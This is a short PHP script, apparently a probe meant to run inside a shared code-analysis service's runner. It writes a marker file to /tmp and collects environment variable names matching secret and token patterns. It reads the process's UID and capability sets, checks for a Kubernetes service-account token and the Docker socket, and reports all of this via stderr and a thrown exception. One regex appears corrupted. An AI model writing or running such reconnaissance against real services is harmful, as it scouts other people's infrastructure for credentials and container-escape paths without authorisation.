<?php
$markerPath = '/tmp/codex_shared_probe_20260716';
$markerValue = 'PUBLIC_MARKER_20260716';
$writeBytes = @file_put_contents($markerPath, $markerValue);
$markerExists = is_file($markerPath) ? 1 : 0;
$markerLen = $markerExists ? @filesize($markerPath) : 0;
$names = array_merge(array_keys($_SERVER), array_keys($_ENV));
$all = getenv();
if (is_array($all)) { $names = array_merge($names, array_keys($all)); }
$hits = array_values(array_unique(array_filter($names, function($n) { return preg_match('/TOKEN|API_KEY|SECRET|CREDENTIAL|PASSWORD|GITHUB|CODACY/i', $n); })));
$status = @file_get_contents('/proc/self/status');
$capEff = ''; $capBnd = ''; $statusUid = '';
foreach (preg_split('/?
/', (string)$status) as $line) {
    if (strpos($line, 'CapEff:') === 0) { $capEff = trim(substr($line, 7)); }
    if (strpos($line, 'CapBnd:') === 0) { $capBnd = trim(substr($line, 7)); }
    if (strpos($line, 'Uid:') === 0) { $statusUid = trim(substr($line, 4)); }
}
$saToken = (is_file('/var/run/secrets/kubernetes.io/serviceaccount/token') || is_file('/run/secrets/kubernetes.io/serviceaccount/token')) ? 1 : 0;
$dockerSocket = is_file('/var/run/docker.sock') ? 1 : 0;
fwrite(STDERR, 'PHPMD_SHARED_TMP_WRITE write_bytes=' . (int)$writeBytes . ' exists=' . $markerExists . ' len=' . (int)$markerLen . ' status_uid=' . $statusUid . ' cap_eff=' . $capEff . ' cap_bnd=' . $capBnd . ' token_name_count=' . count($hits) . ' sa_token_file=' . $saToken . ' docker_socket=' . $dockerSocket . PHP_EOL);
throw new RuntimeException('PHPMD_SHARED_TMP_WRITE');